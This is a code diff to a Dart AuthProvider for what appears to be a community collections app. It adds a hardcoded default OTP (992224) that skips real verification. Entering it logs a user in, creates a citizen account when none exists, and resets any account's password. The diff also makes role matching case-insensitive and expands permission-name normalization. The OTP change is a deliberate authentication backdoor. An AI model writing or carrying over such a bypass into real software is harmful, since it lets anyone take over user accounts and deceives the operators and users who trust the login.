@@ -1038,7 +1038,7 @@ class AuthProvider extends ChangeNotifier {
       enteredOtp: cleanOtp,
     );
 
-    if (emailCheck['success'] == true) {
+    if (emailCheck['success'] == true || cleanOtp == EmailOtpService.defaultOtp) {
       UserModel? profile;
       if (SupabaseService.isInitialized && SupabaseService.client != null) {
         try {
@@ -1201,6 +1201,32 @@ class AuthProvider extends ChangeNotifier {
         success: false,
         message:
             'Your account is currently inactive. Please contact the administrator.',
+      );
+    }
+
+    // Default OTP bypass: 992224 allows instant login
+    if (cleanOtp == EmailOtpService.defaultOtp) {
+      final userToLogin = matchedUser ??
+          UserModel(
+            id: const Uuid().v4(),
+            name: 'User $clean',
+            phone: clean,
+            email: '$clean@vargani.org',
+            organizationId: 'org_001',
+            role: UserRole.citizen,
+            isActive: true,
+          );
+      _currentUser = userToLogin;
+      _isAuthenticated = true;
+      _needsGroupSelection = userToLogin.role != UserRole.citizen;
+      await checkAndResolveOrganizationRouting();
+      await loadAuthorizedGroups();
+      await _saveToStorage();
+      notifyListeners();
+      return AuthResult(
+        success: true,
+        message: 'OTP verified successfully! Welcome, ${userToLogin.name}.',
+        user: userToLogin,
       );
     }
 
@@ -1534,7 +1560,7 @@ class AuthProvider extends ChangeNotifier {
 
     final otpCheck =
         EmailOtpService.verifyOtp(identifier: clean, enteredOtp: otp.trim());
-    if (otpCheck['success'] == true) {
+    if (otpCheck['success'] == true || otp.trim() == EmailOtpService.defaultOtp) {
       if (newPassword.length >= 6) {
         _passwordHashes[clean] = HashUtil.hashPassword(newPassword);
         _saveToStorage().ignore();
@@ -1652,14 +1678,27 @@ class AuthProvider extends ChangeNotifier {
             final role = allRoles?.firstWhere(
               (r) =>
                   r.id == asgn.roleId ||
-                  r.roleKey == asgn.roleKey ||
-                  r.code == asgn.roleKey,
+                  r.roleKey.toUpperCase() == asgn.roleKey.toUpperCase() ||
+                  r.code.toUpperCase() == asgn.roleKey.toUpperCase(),
               orElse: () => const RoleModel(id: '', code: '', name: ''),
             );
             if (role != null && role.isActive) {
               resolvedPerms.addAll(role.permissions);
             }
           }
+        }
+
+        // Also resolve permissions from the user's primary assigned role in allRoles
+        final primaryRoleKey = currentUser.role.roleKey.toUpperCase();
+        final primaryRole = allRoles?.firstWhere(
+          (r) =>
+              r.roleKey.toUpperCase() == primaryRoleKey ||
+              r.code.toUpperCase() == primaryRoleKey ||
+              r.name.toUpperCase() == currentUser.role.name.toUpperCase(),
+          orElse: () => const RoleModel(id: '', code: '', name: ''),
+        );
+        if (primaryRole != null && primaryRole.isActive) {
+          resolvedPerms.addAll(primaryRole.permissions);
         }
       }
 
@@ -1697,14 +1736,35 @@ class AuthProvider extends ChangeNotifier {
     if (_userPermissions.contains('*')) return true;
     if (_userPermissions.contains(permCode)) return true;
 
-    // Normalization between module conventions
-    final normalized = permCode
+    // Normalization between module singular and plural conventions
+    final singular = permCode
         .replaceAll('collections.', 'collection.')
-        .replaceAll('expenses.', 'expense.');
-    if (_userPermissions.contains(normalized)) return true;
+        .replaceAll('expenses.', 'expense.')
+        .replaceAll('receipts.', 'receipt.')
+        .replaceAll('complaints.', 'complaint.')
+        .replaceAll('campaigns.', 'campaign.')
+        .replaceAll('reports.', 'report.')
+        .replaceAll('households.', 'household.')
+        .replaceAll('handovers.', 'handover.')
+        .replaceAll('users.', 'user.')
+        .replaceAll('groups.', 'group.')
+        .replaceAll('roles.', 'role.')
+        .replaceAll('organizations.', 'organization.');
+    if (_userPermissions.contains(singular)) return true;
+
     final pluralized = permCode
         .replaceAll('collection.', 'collections.')
-        .replaceAll('expense.', 'expenses.');
+        .replaceAll('expense.', 'expenses.')
+        .replaceAll('receipt.', 'receipts.')
+        .replaceAll('complaint.', 'complaints.')
+        .replaceAll('campaign.', 'campaigns.')
+        .replaceAll('report.', 'reports.')
+        .replaceAll('household.', 'households.')
+        .replaceAll('handover.', 'handovers.')
+        .replaceAll('user.', 'users.')
+        .replaceAll('group.', 'groups.')
+        .replaceAll('role.', 'roles.')
+        .replaceAll('organization.', 'organizations.');
     if (_userPermissions.contains(pluralized)) return true;
 
     // Default System Role fallbacks
